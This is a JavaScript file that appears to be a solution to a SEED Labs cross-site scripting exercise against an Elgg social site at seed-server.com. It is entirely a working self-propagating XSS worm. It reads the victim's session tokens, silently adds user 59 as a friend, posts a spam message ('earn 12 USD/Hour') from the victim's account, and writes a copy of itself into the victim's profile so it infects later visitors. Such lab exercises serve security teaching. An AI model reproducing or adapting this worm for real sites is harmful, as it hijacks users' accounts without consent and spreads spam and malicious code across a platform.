
<script id=worm>
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		 
		//Construct the HTTP request to add Samy as a friend.
	
		 var sendurl = "http://www.seed-server.com/action/friends/add?friend=59"+ ts +ts+ token+token;
	
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

    
		var name=elgg.session.user.username;
		var id=elgg.session.user.guid;

		var profileLink="http://www.seed-server.com/profile/"+name;
    	sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
		var content=token+ts+
        "&body= To earn 12 USD/Hour(!), Visit now :" +profileLink+
        "&guid="+id;

		if(elgg.page_owner.name != elgg.session.user.name){
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	content=token+ts+
	"&description="+wormCode+
	"&guid="+id;
	
	if(elgg.page_owner.name != elgg.session.user.name){
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
        
	}
	
</script>